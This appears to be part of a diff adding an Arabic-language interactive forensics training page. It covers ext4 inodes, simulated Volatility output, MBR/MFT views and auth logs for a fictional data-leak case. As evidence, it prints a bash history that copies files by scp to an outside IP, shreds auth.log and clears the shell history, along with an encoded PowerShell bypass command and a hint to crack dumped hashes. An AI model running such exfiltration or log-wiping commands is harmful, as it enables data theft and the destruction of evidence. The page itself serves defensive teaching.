+      <button class="btn btn-green" style="margin-top:10px" onclick="checkQ('q-linux','b','linux-res',15)">إرسال</button>
+      <div id="linux-res"></div>
+    </div>
+  </div>
+</div>
+
+<!-- EXT4 -->
+<div class="panel" id="tab-ext4">
+  <h2>🗄️ نظام ملفات ext4 — قلب Linux</h2>
+  <p class="sub">ext4 هو نظام الملفات الافتراضي في معظم توزيعات Linux. يختلف عن NTFS في البنية لكن مبدأ الاسترداد مشابه — الـ inode هو مكافئ إدخال MFT.</p>
+
+  <div class="card">
+    <h3>🏗️ بنية ext4 — Block Groups</h3>
+    <div class="ext4-map" id="ext4-map"></div>
+    <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;font-size:.75rem">
+      <span><span style="display:inline-block;width:12px;height:12px;background:#1e3a5c;border-radius:2px;margin-left:4px"></span>Superblock</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#22c55e;border-radius:2px;margin-left:4px"></span>Group Descriptor</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#00d4ff;border-radius:2px;margin-left:4px"></span>Inode Table</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#a855f7;border-radius:2px;margin-left:4px"></span>Data Blocks</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#ffaa00;border-radius:2px;margin-left:4px"></span>Bitmap</span>
+      <span><span style="display:inline-block;width:12px;height:12px;background:#ff4444;border-radius:2px;margin-left:4px"></span>محذوف</span>
+    </div>
+    <div id="ext4-detail" style="margin-top:10px"></div>
+  </div>
+
+  <div class="card">
+    <h3>🔢 الـ Inode — هوية الملف في Linux</h3>
+    <button class="btn btn-green" onclick="showInode()">📋 فحص Inode لملف مشبوه</button>
+    <div id="inode-detail" style="margin-top:12px"></div>
+  </div>
+
+  <div class="card">
+    <h3>🔄 استرداد الملفات المحذوفة من ext4</h3>
+    <div class="terminal">
+      <div class="prompt">analyst@forensics:~$ <span class="cmd">extundelete khalid_server.img --restore-all --output-dir ./recovered/</span></div>
+      <div class="out">Loading journal...
+Searching for recoverable files...
+<span style="color:#22c55e">Recovered: /home/khalid/Documents/transfer_log.txt</span>
+<span style="color:#22c55e">Recovered: /home/khalid/.config/secret_config.json</span>
+<span style="color:#ffaa00">Partially recovered: /tmp/payload.sh (60% intact)</span>
+<span style="color:#ff4444">Cannot recover: /var/log/auth.log (overwritten)</span>
+Files recovered: 2 complete, 1 partial</div>
+    </div>
+    <div class="alert alert-warn">⚠️ المهاجم حذف سجل auth.log لإخفاء آثار الدخول — لكن نسخته في journald قد لا تزال موجودة!</div>
+    <div class="terminal">
+      <div class="prompt">analyst@forensics:~$ <span class="cmd">journalctl --since "2024-03-20" --until "2024-03-21" _SYSTEMD_UNIT=sshd.service</span></div>
+      <div class="out"><span style="color:#22c55e">Mar 20 09:15:22 server sshd[2341]: Accepted publickey for root from 185.220.101.42</span>
+Mar 20 09:15:23 server sshd[2341]: pam_unix(sshd:session): session opened for user root</div>
+    </div>
+    <div class="alert alert-danger">🚨 دخول SSH كـ root من الـ IP الخبيث المعروف — بمفتاح عام مسروق!</div>
+    <div class="quiz-box">
+      <h4>❓ ما الفرق الرئيسي بين Inode في ext4 و إدخال MFT في NTFS؟</h4>
+      <div class="options" id="q-ext4">
+        <label><input type="radio" name="q-ext4" value="a"> لا فرق — كلاهما يحفظ محتوى الملف مباشرة</label>
+        <label><input type="radio" name="q-ext4" value="b"> كلاهما يحفظ metadata الملف (الحجم، التواريخ، الصلاحيات) لكن اسم الملف في ext4 مخزّن في Directory Entry منفصل، بينما MFT يخزنه داخل الإدخال</label>
+        <label><input type="radio" name="q-ext4" value="c"> Inode يحفظ المحتوى، MFT يحفظ الاسم فقط</label>
+        <label><input type="radio" name="q-ext4" value="d"> MFT أحدث وأكثر أماناً دائماً</label>
+      </div>
+      <button class="btn btn-green" style="margin-top:10px" onclick="checkQ('q-ext4','b','ext4-res',15)">إرسال</button>
+      <div id="ext4-res"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  function fixTap(){
+    document.querySelectorAll('[onclick]').forEach(function(el){
+      el.style.cursor='pointer';
+      el.style.webkitUserSelect='none';
+      el.style.userSelect='none';
+      el.style.touchAction='manipulation';
+    });
+  }
+  fixTap();
+  new MutationObserver(fixTap).observe(document.body,{childList:true,subtree:true});
+  var moved=false;
+  document.addEventListener('touchstart',function(){moved=false;},{passive:true});
+  document.addEventListener('touchmove',function(){moved=true;},{passive:true});
+  document.addEventListener('touchend',function(e){
+    if(moved)return;
+    var el=e.target;
+    while(el&&el!==document.body){
+      if(el.hasAttribute('onclick')){e.preventDefault();el.click();return;}
+      el=el.parentElement;
+    }
+  },false);
+})();
+
+// RAM Items
+const ramItems={
+  passwords:{title:'🔑 كلمات المرور في الذاكرة',content:'أدوات مثل <strong>Mimikatz</strong> تستطيع استخراج كلمات المرور من LSASS process في الذاكرة — حتى لو كانت Windows Hello أو BitLocker. في Volatility: <code>windows.hashdump</code>',color:'#22c55e'},
+  processes:{title:'⚙️ العمليات الجارية',content:'حتى العمليات التي تُخفي نفسها من Task Manager (Rootkits) يمكن رؤيتها في RAM dump عبر مقارنة EPROCESS linked list بـ PspCidTable. في Volatility: <code>windows.pslist</code> و <code>windows.psscan</code>',color:'#00d4ff'},
+  network:{title:'🌐 الاتصالات الشبكية',content:'نرى كل TCP/UDP connections المفتوحة بما فيها اتصالات C2 المشفّرة — نعرف الـ IP والـ Port والـ Process المسؤول. في Volatility: <code>windows.netscan</code>',color:'#7ab3d4'},
+  encryption:{title:'🔐 مفاتيح التشفير',content:'BitLocker يُخزّن مفتاح فك التشفير في الذاكرة طوال وقت تشغيل الجهاز. أداة <strong>Elcomsoft Forensic Disk Decryptor</strong> تستخرجه من الـ RAM dump لفك تشفير القرص.',color:'#a855f7'},
+  clipboard:{title:'📋 محتوى الحافظة',content:'ما نسخه المستخدم قبل الإيقاف مخزّن في الذاكرة — قد يكون كلمة مرور أو نص سري. في Volatility: <code>windows.clipboard</code>',color:'#ffaa00'},
+  malware:{title:'🦠 Fileless Malware',content:'بعض البرمجيات الخبيثة تعمل بالكامل في الذاكرة دون كتابة أي ملف على القرص — لا يكتشفها مكافح الفيروسات التقليدي. الـ RAM dump هو الطريقة الوحيدة لاكتشافها.',color:'#ff4444'},
+};
+
+function showRAMItem(el,type){
+  document.querySelectorAll('#tab-ram [onclick]').forEach(e=>{e.style.borderColor='#1e5c3a'});
+  el.style.borderColor=ramItems[type].color;
+  document.getElementById('ram-item-detail').innerHTML=`
+  <div style="background:#071020;border:1px solid #1e5c3a;border-radius:8px;padding:14px;margin-top:4px">
+    <h4 style="color:${ramItems[type].color};margin-bottom:8px">${ramItems[type].title}</h4>
+    <p style="color:#aab8c8;font-size:.85rem;line-height:1.8">${ramItems[type].content}</p>
+  </div>`;
+}
+
+// Memory Map
+function buildMemMap(){
+  const blocks=[
+    {addr:'0x0000',label:'نواة OS',color:'#22c55e',tip:'نظام التشغيل — محمي'},
+    {addr:'0x2000',label:'OS Drivers',color:'#16a34a',tip:'تعريفات الأجهزة'},
+    {addr:'0x4000',label:'فارغ',color:'#1e3a5c',tip:'ذاكرة غير مستخدمة'},
+    {addr:'0x6000',label:'Chrome',color:'#00d4ff',tip:'متصفح Chrome — 412MB'},
+    {addr:'0x8000',label:'Office',color:'#0284c7',tip:'Microsoft Office'},
+    {addr:'0xA000',label:'⚠️ مجهول',color:'#a855f7',tip:'منطقة ذاكرة مجهولة — مشبوه! قد تكون Shellcode'},
+    {addr:'0xC000',label:'Cache',color:'#ffaa00',tip:'ذاكرة مؤقتة للنظام'},
+    {addr:'0xE000',label:'فارغ',color:'#1e3a5c',tip:'ذاكرة غير مستخدمة'},
+  ];
+  const map=document.getElementById('mem-map');
+  blocks.forEach(b=>{
+    const row=document.createElement('div');
+    row.className='mem-row';
+    row.innerHTML=`<div class="mem-addr">${b.addr}</div><div class="mem-block" style="background:${b.color}" onclick="showMemDetail('${b.tip}')" title="${b.tip}">${b.label}</div>`;
+    map.appendChild(row);
+  });
+}
+
+function showMemDetail(tip){
+  document.getElementById('mem-detail').innerHTML=`<div class="alert alert-info">📍 ${tip}</div>`;
+}
+
+// Volatility Plugins
+const volOutputs={
+  pslist:`Volatility 3 — windows.pslist
+PID   PPID  Name              Threads  Create Time
+4     0     System            131      2024-03-20 08:00:01
+392   4     smss.exe          2        2024-03-20 08:00:05
+540   532   csrss.exe         10       2024-03-20 08:00:08
+616   608   winlogon.exe      4        2024-03-20 08:00:09
+680   672   services.exe      8        2024-03-20 08:00:10
+692   680   svchost.exe       20       2024-03-20 08:00:11
+1204  1196  explorer.exe      45       2024-03-20 08:05:22
+\x1b[31m4892  1204  svchost32.exe     3        2024-03-20 14:32:00  ← مشبوه: أُطلق من explorer!\x1b[0m
+4896  4892  cmd.exe           1        2024-03-20 14:32:01
+4900  4892  powershell.exe    2        2024-03-20 14:32:02`,
+  pstree:`Volatility 3 — windows.pstree
+* System (4)
+.* smss.exe (392)
+..* csrss.exe (540)
+..* winlogon.exe (616)
+...* services.exe (680)
+....* svchost.exe (692) ← طبيعي
+* explorer.exe (1204)
+..* chrome.exe (2341)
+..* notepad.exe (3892)
+\x1b[31m..* svchost32.exe (4892) ← خطأ! svchost يجب أن يكون تحت services.exe\x1b[0m
+\x1b[31m....* cmd.exe (4896)\x1b[0m
+\x1b[31m....* powershell.exe (4900)\x1b[0m`,
+  netscan:`Volatility 3 — windows.netscan
+Proto  LocalAddr        LocalPort  ForeignAddr       ForeignPort  State    PID   Name
+TCP    192.168.1.105    49823      8.8.8.8           53           CLOSED   692   svchost.exe
+TCP    192.168.1.105    443        172.217.18.46     443          ESTAB    2341  chrome.exe
+\x1b[31mTCP    192.168.1.105    50234      185.220.101.42    443          ESTAB    4912  svchost32.exe ← C2!\x1b[0m
+UDP    0.0.0.0          5353       *                 *            -        692   svchost.exe`,
+  cmdline:`Volatility 3 — windows.cmdline
+PID   Name            Command
+1204  explorer.exe    C:\\Windows\\Explorer.EXE
+2341  chrome.exe      "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
+\x1b[31m4892  svchost32.exe   C:\\Users\\khalid\\AppData\\Roaming\\svchost32.exe -s\x1b[0m
+\x1b[31m4896  cmd.exe         cmd /c powershell -ExecutionPolicy Bypass -enc JABjACAA...\x1b[0m
+\x1b[31m4900  powershell.exe  powershell -ExecutionPolicy Bypass -enc JABjACAA... ← base64 encoded!\x1b[0m`,
+  hashdump:`Volatility 3 — windows.hashdump
+User         RID    LM Hash                          NT Hash
+Administrator 500   aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
+Guest        501   aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
+\x1b[33mkhalid       1001  aad3b435b51404eeaad3b435b51404ee  a3f7c9d2e1b845f012345678abcdef01\x1b[0m
+[*] Pass these NT hashes to hashcat or John the Ripper for cracking`,
+  malfind:`Volatility 3 — windows.malfind
+PID   Name          VadAddress  Protection    Suspicious
+\x1b[31m4892  svchost32.exe 0x7FF000000  PAGE_EXECUTE_READWRITE  YES ← RWX memory = shellcode!\x1b[0m
+\x1b[31m      Hexdump: FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51\x1b[0m
+\x1b[31m      Disasm:  xor ecx,ecx / push rbp / mov rbp,rsp  ← shellcode pattern\x1b[0m`,
+  dlllist:`Volatility 3 — windows.dlllist (PID 4892 — svchost32.exe)
+Base          Size    Name
+0x7ff...000   180K    ntdll.dll         ← طبيعي
+0x7fe...000   820K    kernel32.dll      ← طبيعي
+\x1b[31m0x320...000   44K     UNKNOWN_DLL.dll   ← بدون مسار! = DLL مُحقون في الذاكرة\x1b[0m
+0x7fd...000   1.2M    ws2_32.dll        ← طبيعي`
+};
+
+function runVolPlugin(el,plugin){
+  document.querySelectorAll('.volatility-plugin').forEach(p=>p.classList.remove('run'));
+  el.classList.add('run');
+  document.getElementById('vol-plugin-name').textContent='windows.'+plugin;
+  const output=volOutputs[plugin]||'لا توجد نتائج';
+  document.getElementById('vol-output').textContent=output.replace(/\x1b\[\d+m/g,'');
+  // Color the output
+  let colored=output
+    .replace(/\x1b\[31m(.*?)\x1b\[0m/gs,'<span style="color:#ff4444">$1</span>')
+    .replace(/\x1b\[33m(.*?)\x1b\[0m/gs,'<span style="color:#ffaa00">$1</span>');
+  document.getElementById('vol-output').innerHTML=colored;
+}
+
+// Process list
+const processes=[
+  {pid:680,ppid:672,name:'services.exe',path:'C:\\Windows\\System32\\services.exe',malicious:false},
+  {pid:692,ppid:680,name:'svchost.exe',path:'C:\\Windows\\System32\\svchost.exe -k LocalService',malicious:false},
+  {pid:1204,ppid:608,name:'explorer.exe',path:'C:\\Windows\\Explorer.EXE',malicious:false},
+  {pid:4892,ppid:1204,name:'svchost32.exe ⚠️',path:'C:\\Users\\khalid\\AppData\\Roaming\\svchost32.exe',malicious:true},
+  {pid:4896,ppid:4892,name:'cmd.exe',path:'cmd /c powershell -enc JABj...',malicious:true},
+];
+
+function buildProcessList(){
+  const list=document.getElementById('process-list');
+  processes.forEach(p=>{
+    const row=document.createElement('div');
+    row.className='process-row'+(p.malicious?' malicious':'');
+    row.innerHTML=`<span class="p-pid">${p.pid}</span><span class="p-name" style="color:${p.malicious?'#ff8888':'#e0e6f0'}">${p.name}</span><span class="p-ppid">${p.ppid}</span><span class="p-path">${p.path}</span>`;
+    list.appendChild(row);
+  });
+  document.getElementById('process-note').innerHTML=`<div class="alert alert-danger">🚨 svchost32.exe (PID 4892) أُطلق من explorer.exe (PPID 1204) — المشروع يُطلَق من services.exe فقط. هذا Process Masquerading!</div>`;
+  document.getElementById('process-note').style.display='block';
+}
+
+// MBR
+function showMBRSection(sec){
+  const details={
+    bootcode:`<div class="alert alert-info"><strong>Bootstrap Code (446 بايت):</strong> كود تشغيلي يُنفَّذ عند بدء الجهاز — يقرأ جدول الأقسام ويُحدد القسم النشط للإقلاع. بعض الـ Bootkits تعدّل هذا الجزء لتثبيت نفسها.</div>`,
+    parttable:`<div class="alert alert-info"><strong>Partition Table (64 بايت):</strong> 4 إدخالات × 16 بايت لكل منها. كل إدخال يحدد: نوع القسم، القطاع الأول والأخير، حالة النشاط. في GPT يوجد 128 إدخاراً بـ GUID فريد لكل قسم.</div>`,
+    sig:`<div class="alert alert-info"><strong>Boot Signature (0x55AA):</strong> البايتان الأخيران من MBR. إذا كانا مختلفَين → القرص غير قابل للإقلاع أو تالف. الـ Forensic Tool يتحقق منهما أولاً.</div>`
+  };
+  document.getElementById('mbr-detail').innerHTML=details[sec]||'';
+}
+
+function showMBRHex(){
+  document.getElementById('mbr-hex').innerHTML=`
+  <div style="background:#020a06;border:1px solid #1e3a5c;border-radius:8px;padding:12px;font-family:'Courier New',monospace;font-size:.72rem;overflow-x:auto">
+    <div style="color:#7ab3d4;margin-bottom:6px">── أول 64 بايت من MBR ──</div>
+    <div style="color:#22c55e">0000: 33 C0 8E D0 BC 00 7C 8E C0 8E D8 BE 00 7C BF 00</div>
+    <div style="color:#22c55e">0010: 06 B9 00 01 F3 A5 EA 1D 06 00 00 FF FF 00 00 00</div>
+    <div style="color:#7ab3d4">...Bootstrap Code (446 بايت)...</div>
+    <div style="color:#00d4ff">01BE: 80 20 21 00 0B FE FF FF 00 08 00 00 00 20 03 00</div>
+    <div style="color:#00d4ff">01CE: 00 FE FF FF 0C FE FF FF 00 28 03 00 00 00 00 04</div>
+    <div style="color:#ff4444">01DE: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ← قسم مخفي بدون نوع!</div>
+    <div style="color:#ffaa00">01FE: <strong>55 AA</strong>  ← Boot Signature</div>
+  </div>`;
+}
+
+function mountHidden(){
+  document.getElementById('hidden-result').innerHTML=`
+  <div class="terminal">
+    <div class="prompt">analyst@forensics:~$ <span class="cmd">mount -o loop,offset=$((943720448*512)) khalid_disk.img /mnt/hidden/</span></div>
+    <div class="out">Mounted successfully.
+$ ls -la /mnt/hidden/
+<span style="color:#ff4444">-rw-r--r-- 1 root root  88241152 Mar 20 14:30 secret_transfer.xlsx
+-rw-r--r-- 1 root root 122880000 Mar 20 14:30 company_data_full.zip
+-rw-r--r-- 1 root root     48291 Mar 20 14:30 payment_proof.pdf</span></div>
+  </div>
+  <div class="alert alert-danger">🚨 القسم المخفي يحتوي على نسخة من الملفات المسرَّبة! دليل على تخطيط مسبق.</div>`;
+}
+
+// MFT
+function showMFTDetail(){
+  document.getElementById('mft-detail').innerHTML=`
+  <div class="alert alert-info">📋 <strong>Master File Table ($MFT):</strong> جدول بإدخال 1024 بايت لكل ملف ومجلد. أول 16 إدخاراً محجوزة للنظام ($MFT، $MFTMirr، $LogFile، $Volume...). حتى الملفات المحذوفة تبقى إدخالاتها حتى يُعاد استخدام المساحة.</div>`;
+}
+
+function showMFTEntry(){
+  document.getElementById('mft-entry').innerHTML=`
+  <div style="background:#020a06;border:1px solid #1e3a5c;border-radius:8px;padding:14px;font-family:'Courier New',monospace;font-size:.76rem;line-height:2">
+    <div style="color:#22c55e;margin-bottom:8px">── MFT Entry #48291 — secret_transfer.xlsx ──</div>
+    <div><span style="color:#7ab3d4;display:inline-block;min-width:200px">Signature:</span> FILE (valid)</div>
+    <div><span style="color:#7ab3d4;display:inline-block;min-width:200px">Allocated:</span> <span style="color:#ff4444">No ← محذوف!</span></div>
+    <div><span style="color:#7ab3d4;display:inline-block;min-width:200px">Filename:</span> secret_transfer.xlsx</div>
+    <div><span style="color:#7ab3d4;display:inline-block;min-width:200px">Size:</span> 88,241,152 bytes (84.1 MB)</div>
+    <div><span style="color:#7ab3d4;display:inline-block;min-width:200px">Created:</span> 2024-03-15 09:22:11</div>
+    <div><span style="color:#7ab3d4;display:inline-block;min-width:200px">Modified:</span> <span style="color:#ffaa00">2024-03-20 14:28:44</span></div>
+    <div><span style="color:#7ab3d4;display:inline-block;min-width:200px">Deleted:</span> <span style="color:#ff4444">2024-03-20 14:30:22</span></div>
+    <div><span style="color:#7ab3d4;display:inline-block;min-width:200px">Data Runs:</span> Cluster 841200–841643 (يمكن استرداده!)</div>
+  </div>
+  <div class="alert alert-success" style="margin-top:10px">✅ البيانات الفعلية لا تزال في Clusters 841200–841643 — يمكن استرداد الملف!</div>`;
+}
+
+// Linux / bash_history
+function showBashHistory(){
+  document.getElementById('bash-history').innerHTML=`
+  <div class="linux-log">
+    <div><span class="log-time">2024-03-20 08:15</span> <span style="color:#7ab3d4">ls -la /home/khalid/Documents/</span></div>
+    <div><span class="log-time">2024-03-20 08:22</span> <span style="color:#7ab3d4">cat /etc/passwd</span></div>
+    <div><span class="log-time">2024-03-20 13:55</span> <span style="color:#ffaa00">ssh root@185.220.101.42</span></div>
+    <div><span class="log-time">2024-03-20 14:20</span> <span style="color:#ff4444">scp secret_transfer.xlsx root@185.220.101.42:/uploads/</span></div>
+    <div><span class="log-time">2024-03-20 14:25</span> <span style="color:#ff4444">scp company_data_full.zip root@185.220.101.42:/uploads/</span></div>
+    <div><span class="log-time">2024-03-20 14:30</span> <span style="color:#ff4444">rm -rf ~/Documents/secret_transfer.xlsx ~/Documents/company_data_full.zip</span></div>
+    <div><span class="log-time">2024-03-20 14:31</span> <span style="color:#ff4444">shred -vfz -n 3 /var/log/auth.log</span> <span style="color:#ffaa00">← حاول مسح السجل!</span></div>
+    <div><span class="log-time">2024-03-20 14:32</span> <span style="color:#ff4444">history -c && history -w</span> <span style="color:#ffaa00">← حاول مسح التاريخ — لكنه محفوظ في الـ RAM dump!</span></div>
+  </div>
+  <div class="alert alert-danger" style="margin-top:10px">🚨 bash_history يُثبت: نقل الملفات بـ scp إلى الـ IP الخبيث، ثم حذفها، ثم محاولة مسح الدليل!</div>`;
+}
+
+const authLogs=[
+  {time:'Mar 20 08:00:15',host:'server',svc:'sshd',msg:'Accepted password for khalid from 192.168.1.50 port 22',type:'normal'},
+  {time:'Mar 20 08:05:30',host:'server',svc:'sudo',msg:'khalid : TTY=pts/0 ; COMMAND=/usr/bin/apt-get update',type:'sudo'},
+  {time:'Mar 20 13:50:00',host:'server',svc:'sshd',msg:'Failed password for root from 185.220.101.42 port 45231',type:'failed'},
+  {time:'Mar 20 13:50:01',host:'server',svc:'sshd',msg:'Failed password for root from 185.220.101.42 port 45232',type:'failed'},
+  {time:'Mar 20 13:50:02',host:'server',svc:'sshd',msg:'Failed password for root from 185.220.101.42 port 45233',type:'failed'},
+  {time:'Mar 20 13:55:22',host:'server',svc:'sshd',msg:'Accepted publickey for root from 185.220.101.42 port 45300',type:'ssh'},
+  {time:'Mar 20 13:55:23',host:'server',svc:'sshd',msg:'pam_unix: session opened for user root by khalid',type:'normal'},
+  {time:'Mar 20 14:31:00',host:'server',svc:'sudo',msg:'root : TTY=pts/1 ; COMMAND=/usr/bin/shred /var/log/auth.log',type:'sudo'},
+];
+
+function renderAuthLog(entries){
+  document.getElementById('auth-log').innerHTML=entries.map(e=>{
+    const color=e.type==='failed'?'#ff4444':e.type==='sudo'?'#ffaa00':e.type==='ssh'?'#22c55e':'#aab8c8';
+    return `<div><span class="log-time">${e.time}</span> <span class="log-host">${e.host}</span> <span class="log-service">${e.svc}:</span> <span style="color:${color}">${e.msg}</span></div>`;
+  }).join('');
+}
+
+function loadAuthLog(){renderAuthLog(authLogs);analyzeLog(authLogs)}
+function filterAuthLog(type){
+  const filtered=authLogs.filter(e=>e.type===type||e.type==='normal'&&type==='all');
+  renderAuthLog(type==='failed'?authLogs.filter(e=>e.type==='failed'):type==='sudo'?authLogs.filter(e=>e.type==='sudo'):authLogs.filter(e=>e.type==='ssh'));
+}
+function analyzeLog(entries){
+  const failed=entries.filter(e=>e.type==='failed').length;
+  if(failed>0) document.getElementById('auth-analysis').innerHTML=`<div class="alert alert-danger">🚨 ${failed} محاولة دخول فاشلة من 185.220.101.42 — ثم نجحت بمفتاح عام مسروق!</div>`;
+}
+
+// ext4 map
+function buildExt4Map(){
+  const blocks=[
+    {label:'Super\nblock',color:'#1e3a5c'},{label:'Group\nDesc',color:'#22c55e'},
+    {label:'Block\nBitmap',color:'#ffaa00'},{label:'Inode\nBitmap',color:'#ffaa00'},
+    {label:'Inode\nTable',color:'#00d4ff'},{label:'Inode\nTable',color:'#00d4ff'},
+    {label:'Data\nBlocks',color:'#a855f7'},{label:'Data\nBlocks',color:'#a855f7'},
+    {label:'Data\nBlocks',color:'#a855f7'},{label:'Data\nBlocks',color:'#a855f7'},
+    {label:'Data\n[محذوف]',color:'#ff4444'},{label:'Data\nBlocks',color:'#a855f7'},
+    {label:'Data\nBlocks',color:'#a855f7'},{label:'Super\nblock',color:'#1e3a5c'},
+    {label:'Group\nDesc',color:'#22c55e'},{label:'...',color:'#1e3a5c'},
+  ];
+  const map=document.getElementById('ext4-map');
+  blocks.forEach((b,i)=>{
+    const el=document.createElement('div');
+    el.className='ext4-block';
+    el.style.background=b.color;
+    el.style.color='rgba(255,255,255,.8)';
+    el.textContent=b.label;
+    el.onclick=()=>{document.getElementById('ext4-detail').innerHTML=`<div class="alert alert-info">📦 ${b.label}: ${getExt4Desc(b.label)}</div>`};
+    map.appendChild(el);
+  });
+}
+
+function getExt4Desc(label){
+  const d={'Super\nblock':'معلومات نظام الملفات الكلي — الحجم، عدد الـ Inodes، حجم الـ Block','Group\nDesc':'وصف Block Group — موقع الـ Bitmaps والـ Inode Table','Block\nBitmap':'خريطة bits تُبيّن الـ Blocks المستخدمة والفارغة','Inode\nBitmap':'خريطة bits تُبيّن الـ Inodes المستخدمة والمحررة','Inode\nTable':'جدول الـ Inodes — metadata كل الملفات في هذه المجموعة','Data\nBlocks':'بيانات الملفات الفعلية','Data\n[محذوف]':'Block لملف محذوف — البيانات لا تزال موجودة! يمكن الاسترداد'};
+  return Object.entries(d).find(([k])=>label.includes(k.split('\n')[0]))?.[1]||'مكوّن من مكونات نظام الملفات';
+}
+
+function showInode(){
+  document.getElementById('inode-detail').innerHTML=`
+  <div style="background:#020a06;border:1px solid #1e3a5c;border-radius:8px;padding:14px;font-family:'Courier New',monospace;font-size:.76rem;line-height:2">
+    <div style="color:#22c55e;margin-bottom:6px">── Inode 48291 — /home/khalid/transfer_log.txt ──</div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">File type:</span> Regular file</div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">Permissions:</span> -rw------- (600)</div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">Owner UID:</span> 1001 (khalid)</div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">Size:</span> 4,281 bytes</div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">atime (last access):</span> 2024-03-20 14:28:33</div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">mtime (last modify):</span> <span style="color:#ffaa00">2024-03-20 14:25:11</span></div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">ctime (inode change):</span> 2024-03-20 14:30:05</div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">Link count:</span> <span style="color:#ff4444">0 ← محذوف (لا روابط)</span></div>
+    <div><span style="color:#7ab3d4;min-width:180px;display:inline-block">Data blocks:</span> 841200, 841201 (قابل للاسترداد)</div>
+  </div>
+  <div class="alert alert-warn" style="margin-top:10px">⏰ التواريخ الثلاثة (atime/mtime/ctime) تُشكّل جدولاً زمنياً دقيقاً لكل ما حدث للملف!</div>`;
+}
+
+// Quiz
+const answered={};
+function checkQ(qId,correct,resId,pts){
+  if(answered[qId])return;
+  const sel=document.querySelector(`input[name="${qId}"]:checked`);
+  if(!sel){alert('اختر إجابة أولاً!');return}
+  answered[qId]=true;
+  document.querySelectorAll(`#${qId} label`).forEach(l=>{
+    const v=l.querySelector('input').value;
+    if(v===correct)l.classList.add('correct');
+    else if(l.querySelector('input').checked)l.classList.add('wrong');
+  });
+  document.getElementById(resId).innerHTML=sel.value===correct
+    ?`<div class="alert alert-success">✅ إجابة صحيحة! +${pts} نقطة</div>`
+    :`<div class="alert alert-warn">❌ إجابة خاطئة — راجع الشرح.</div>`;
+}
+
+function showTab(id){
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  document.getElementById('tab-'+id).classList.add('active');
+  const tabs=['ram','volatility','mbr','ntfs','linux','ext4'];
+  document.querySelectorAll('.tab')[tabs.indexOf(id)].classList.add('active');
+}
+
+window.addEventListener('load',()=>{
+  buildMemMap();
+  buildProcessList();
+  buildExt4Map();
+});
+</script>
+</body>
+</html>
